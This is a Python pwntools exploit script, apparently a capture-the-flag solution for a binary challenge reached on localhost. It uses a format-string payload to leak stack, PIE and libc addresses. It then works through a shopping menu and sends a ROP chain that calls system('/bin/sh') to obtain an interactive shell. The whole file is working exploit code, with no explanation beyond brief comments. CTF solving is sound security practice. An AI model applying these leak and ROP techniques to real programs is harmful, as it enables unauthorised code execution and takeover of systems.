from pwn import *

# p = process(["../src/chall"])
p = remote("127.0.0.1",20038)
elf = ELF("../src/chall")
libc = ELF("../src/libc.so.6")
rop = ROP(libc)

# context.log_level = 'debug'

format_payload = "%30000000s,%6$lx,%7$lx,%9$lx"
# Set money, leaks stack address, leaks pie, leaks libc

def set(z):
    x = z & 0xffffffff  # 1st 4 bytes 0x00000000000xxxxxxxxx
    y = ((z & 0xffffffff00000000) >> 32)  # 2nd 4 bytes 0xxxxxxxxxx00000000000
    return x,y

def buy_menu(a,b,c):
    p.sendlineafter(b"? ",str(a))
    p.sendlineafter(b": ",str(b))
    p.sendlineafter(b"? ",str(c))

def skip():
    p.sendlineafter(b"? ",str(0))

p.sendlineafter(b"name: ",format_payload)

p.recvuntil(b",")

leak_stack = int(p.recvuntil(b",", drop=True),16)
leak_pie = int(p.recvuntil(b",", drop=True),16)
leak_libc = int(p.recvuntil(b"!", drop=True),16)

stack_target = leak_stack + 0x8
pie_base = (leak_pie - 38) - elf.symbols['main']
libc.address = (leak_libc - 243) - libc.symbols['__libc_start_main']

ret = rop.find_gadget(['ret']).address
pop_rdi = rop.find_gadget(['pop rdi','ret']).address
binsh = next(libc.search(b"/bin/sh\x00"))
system = libc.symbols['system']

log.info(f"Leak stack\t: {hex(leak_stack)}")
log.info(f"Leak pie\t  : {hex(leak_pie)}")
log.info(f"Leak libc\t : {hex(leak_libc)}")

log.info(f"Stack target\t: {hex(stack_target)}")
log.info(f"Pie Base\t  : {hex(pie_base)}")
log.info(f"Libc Base\t : {hex(libc.address)}")


# gdb.attach(p,gdbscript="""
# init-pwndbg
# """)

skip()
buy_menu(1,4,1) # 30
skip()
buy_menu(1,1,3) # 6


a,b = set(stack_target)

payload = p64(libc.address + ret)
payload += p64(libc.address + pop_rdi)
payload += p64(binsh)
payload += p64(system)
payload += b"\x00"*8
payload += p64(0x291)
payload += b"\x01"

p.sendlineafter("(y/n): ","y")
p.sendlineafter("you wanna cook chef? ", payload)
p.sendlineafter("chef? ", str(a))
p.sendlineafter("chef? ", str(b))

p.interactive()